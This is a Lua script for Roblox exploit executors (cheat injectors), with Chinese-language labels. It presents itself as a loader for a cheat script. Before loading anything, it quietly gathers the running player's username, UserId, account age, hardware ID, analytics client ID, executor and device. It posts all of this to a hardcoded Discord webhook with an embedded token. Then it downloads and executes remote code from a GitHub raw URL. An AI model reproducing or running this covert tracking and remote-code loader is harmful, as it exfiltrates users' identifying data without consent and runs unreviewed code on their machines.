local webhookUrl = "https://discord.com/api/webhooks/1463021845342326977/f5ZNFji4IxIVjklPpOIz7fbPqW6SUJL19rnQYeVeMvCJZEfIUddavaI6Aa2CxiBEdaf9"
local player = game:GetService("Players").LocalPlayer
local joinDate = os.date("!*t", os.time() - player.AccountAge * 86400)
local joinDateFormatted = joinDate.year .. "/" .. joinDate.month .. "/" .. joinDate.day

local deviceType = "Unknown"
if game:GetService("UserInputService").KeyboardEnabled and game:GetService("UserInputService").MouseEnabled then
    deviceType = "模拟器/PC"
elseif game:GetService("UserInputService").TouchEnabled then
    deviceType = "IOS/Android"
else
    deviceType = "未知设备"
end

local executorName = identifyexecutor() or "Unknown"

local avatarUrl = "https://via.placeholder.com/180x180"
local success, avatarData = pcall(function()
    return game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", player.UserId))
end)

if success then
    local httpService = game:GetService("HttpService")
    local avatarJson = httpService:JSONDecode(avatarData)
    if avatarJson and avatarJson.data and avatarJson.data[1] then
        avatarUrl = avatarJson.data[1].imageUrl
    end
end

local placeName = "未知"
local success, result = pcall(function()
    return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
end)
if success then
    placeName = result
end

local hwid = "未知"
if type(gethwid) == "function" then
    hwid = gethwid() or "未知"
end

local clientId = "未知"
local success, result = pcall(function()
    return game:GetService("RbxAnalyticsService"):GetClientId()
end)
if success then
    clientId = result
end

local webhookData = {
    username = "bot",
    embeds = {
        {
            color = tonumber("0x32CD32"),
            title = "有人使用了大寒脚本(通缉脚本)",
            thumbnail = {url = avatarUrl},
            fields = {
                {name = "名称(Name)", value = player.Name, inline = true},
                {name = "昵称(DisplayName)", value = player.DisplayName, inline = true},
                {name = "UserId", value = "[" .. player.UserId .. "](https://www.roblox.com/users/" .. player.UserId .. "/profile)", inline = true},
                {name = "地图ID", value = "[" .. game.PlaceId .. "](https://www.roblox.com/games/" .. game.PlaceId .. ")", inline = true},
                {name = "地图名称", value = placeName, inline = true},
                {name = "使用的注入器", value = executorName, inline = true},
                {name = "账号年龄", value = player.AccountAge .. "天", inline = true},
                {name = "加入日期", value = joinDateFormatted, inline = true},
                {name = "HWID", value = hwid, inline = true},
                {name = "客户端ID", value = clientId, inline = false},
                {name = "设备", value = deviceType, inline = false}
            }
        }
    }
}

local requestFunc = syn and syn.request or http_request or request
if requestFunc then
    pcall(function()
        requestFunc({
            Url = webhookUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode(webhookData)
        })
    end)
end

loadstring(game:HttpGet("https://raw.githubusercontent.com/135246508623/WX/refs/heads/main/%E4%B8%BB%E8%84%9A%E6%9C%AC.lua"))()